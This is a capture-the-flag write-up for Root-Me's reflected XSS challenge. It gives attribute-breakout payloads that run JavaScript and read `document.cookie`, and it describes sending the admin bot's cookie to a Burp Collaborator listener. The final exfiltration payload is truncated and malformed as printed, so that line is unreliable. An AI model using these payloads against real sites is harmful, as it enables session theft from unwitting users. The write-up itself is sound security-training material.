# Root-Me | XSS: Reflected (ch26)

**Category:** Web-Client  
**Challenge:** [http://challenge01.root-me.org/web-client/ch26/](http://challenge01.root-me.org/web-client/ch26/)  
**Vulnerability:** Reflected Cross-Site Scripting (XSS)

## Overview

The goal of this challenge is to exploit a Reflected XSS vulnerability on the target website in order to steal the administrator's cookie, which contains the flag.

## Reconnaissance

I started by browsing the site manually while intercepting traffic with Burp Suite to map out all available endpoints and functionalities.

While exploring, I found a **Contact Us** section containing three fields: `name`, `email`, and `message`. I submitted a test entry through this form and analyzed the resulting request in Burp Suite.

Using the **Reflected** extension in Burp, I identified that the `p` parameter was being reflected unsanitized in the page:

```
/web-client/ch26/?p=contact
```

The value `contact` was directly reflected back into the HTML response.

## Identifying the Injection Context

I tested a few common XSS breakout characters to understand how the input was being handled:

```
"
'
<>
```

I found that using a single quote (`'`) allowed me to break out of the current HTML attribute context.

## Confirming the XSS

Using this, I crafted the following payload to trigger a JavaScript execution via an `autofocus`/`onfocus` event:

```
?p=contact' autofocus onfocus=alert(1) x='
```

This successfully triggered a JavaScript `alert(1)`, confirming the XSS vulnerability.

I then confirmed I could access the `document.cookie` value:

```
?p=contact' autofocus onfocus=alert(document.cookie) x='
```

This returned my own session cookie, proving that arbitrary JavaScript execution was possible in the victim's browser context.

## Exfiltrating the Administrator's Cookie

Since triggering an alert only reveals *my own* cookie, the next step was to deliver this payload to the **administrator**, whose cookie holds the flag.

I set up a listener using **Burp Collaborator** to receive out-of-band HTTP requests.

Final payload used to exfiltrate the cookie via an `<img>` tag injected with `document.write`:

```
http://challenge01.root-me.org/web-client/ch26/?p=contact' onmouseover='document.write(""))
```

Visiting this URL directly returns a 404 page ("The gods will not be pleased. The page ... could not be found."), which includes a **"Report to the administrator"** link. This is the intended delivery mechanism for the challenge: submitting a URL there causes an admin bot to visit it.

Clicking that link generates a report request in the form of:

```
http://challenge01.root-me.org/web-client/ch26/?p=report&url=<encoded malicious URL>
```

## Result

A few moments after reporting the crafted URL to the administrator, an HTTP request containing the admin's `document.cookie` value was received on the Burp Collaborator listener: confirming successful exfiltration of the administrator's session cookie (the flag).

## Key Takeaways

- Always test reflected parameters for injection using basic breakout characters (`'`, `"`, `<`, `>`).
- Out-of-band exfiltration techniques (via Burp Collaborator or similar tools) are essential when the impact of an XSS needs to be demonstrated against another user (e.g., an admin bot).
- Watch out for how the target's "report to admin" or similar bot-simulation features handle URL encoding: double-encoding issues can silently break payloads (e.g. `+` being interpreted as a space rather than the intended `+` character in JavaScript string concatenation).

## Flag

```
[REDACTED - do not publish the flag publicly per Root-Me's rules]
```
